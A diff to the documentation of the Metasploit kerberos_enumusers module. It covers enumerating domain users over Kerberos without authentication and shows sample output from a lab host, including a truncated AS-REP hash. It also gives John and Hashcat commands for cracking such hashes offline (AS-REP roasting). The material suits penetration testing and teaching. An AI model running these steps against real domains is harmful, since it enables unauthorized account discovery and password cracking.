@@ -1,8 +1,20 @@
+## Vulnerable Application
+
 The kerberos_enumusers module is used to enumerate valid Domain Users
 via Kerberos from a wholly unauthenticated perspective. It utilises the
 different responses returned by the service to identify users that exist
 within the target domain. It is also able to identify whether user
 accounts are enabled or disabled/locked out.
+
+## Verification Steps
+
+When verifying the module in the listed examples, it is recommended to test the following accounts:
+
+- Valid account
+- Invalid account
+- Locked/Disabled account
+- Account with spaces
+- AS-REP Roastable accounts
 
 ## Target
 
@@ -15,54 +27,51 @@ The following demonstrates basic usage, using a custom wordlist,
 targeting a single Domain Controller to identify valid domain user
 accounts.
 
-```
-msf > use auxiliary/gather/kerberos_enumusers
-msf auxiliary(kerberos_enumusers) > set DOMAIN MYDOMAIN
-DOMAIN => MYDOMAIN
-msf auxiliary(kerberos_enumusers) > set RHOST 192.168.5.1
-RHOST => 192.168.5.1
-msf auxiliary(kerberos_enumusers) > set USER_FILE /job/users.txt
-USER_FILE => /job/users.txt
-msf auxiliary(kerberos_enumusers) > run
+Create a new `./users.txt` file, then run the module:
 
-[*] Validating options...
-[*] Using domain: MYDOMAIN...
-[*] 192.168.5.1:88 - Testing User: "bob"...
-[*] 192.168.5.1:88 - KDC_ERR_PREAUTH_REQUIRED - Additional
-pre-authentication required
-[+] 192.168.5.1:88 - User: "bob" is present
-[*] 192.168.5.1:88 - Testing User: "alice"...
-[*] 192.168.5.1:88 - KDC_ERR_PREAUTH_REQUIRED - Additional
-pre-authentication required
-[+] 192.168.5.1:88 - User: "alice" is present
-[*] 192.168.5.1:88 - Testing User: "matt"...
-[*] 192.168.5.1:88 - KDC_ERR_PREAUTH_REQUIRED - Additional
-pre-authentication required
-[+] 192.168.5.1:88 - User: "matt" is present
-[*] 192.168.5.1:88 - Testing User: "guest"...
-[*] 192.168.5.1:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have
-been revoked
-[-] 192.168.5.1:88 - User: "guest" account disabled or locked out
-[*] 192.168.5.1:88 - Testing User: "admint"...
-[*] 192.168.5.1:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in
-Kerberos database
-[*] 192.168.5.1:88 - User: "admint" does not exist
-[*] 192.168.5.1:88 - Testing User: "admin"...
-[*] 192.168.5.1:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in
-Kerberos database
-[*] 192.168.5.1:88 - User: "admin" does not exist
-[*] 192.168.5.1:88 - Testing User: "administrator"...
-[*] 192.168.5.1:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in
-Kerberos database
-[*] 192.168.5.1:88 - User: "administrator" does not exist
+```
+msf6 auxiliary(gather/kerberos_enumusers) > run rhost=192.168.123.228 domain=domain.local user_file=./users.txt verbose=true
+[*] Running module against 192.168.123.228
+
+[*] Using domain: ADF3.LOCAL - 192.168.123.228:88...
+[*] 192.168.123.228:88 - User: "missing123" user not found
+[+] 192.168.123.228:88 - User: "administrator" is present
+[+] 192.168.123.228:88 - User: "account with spaces" is present
+[-] 192.168.123.228:88 - User: "locked_account" account disabled or locked out
+[+] 192.168.123.228:88 - User: "no_pre_auth" does not require preauthentication. Hash: $krb5asrep$23$no_pre_auth@DOMAIN.LOCAL:bdb54b9e...etc..etc...
+[+] 192.168.123.228:88 - User: "fake_mysql" is present
+[*] 192.168.123.228:88 - User: "missing1234" user not found
 [*] Auxiliary module execution completed
-msf auxiliary(kerberos_enumusers) >
+msf6 auxiliary(gather/kerberos_enumusers) > 
+```
+
+### ASREPRoast Cracking
+
+Accounts that have `Do not require Kerberos preauthentication` enabled, will receive an ASREP response with a ticket present.
+The technique of cracking this token offline is called ASREPRoasting.
+
+Cracking ASREP response with John:
+
+```
+john ./hashes.txt --wordlist=./wordlist.txt --format:krb5asrep
+```
+
+Cracking ASREP response with Hashcat:
+
+```
+hashcat -m 18200 -a 0 ./hashes.txt ./wordlist.txt
+```
+
+You can see previously creds with:
+
+```
+creds -v
 ```
 
 ## Options
 
-The kerberos_enumusers module only requires the RHOST, DOMAIN and
-USER_FILE options to run.
+The `kerberos_enumusers` module only requires the `RHOST`, `DOMAIN` and
+`USER_FILE` options to run.
 
 **The DOMAIN option**
 
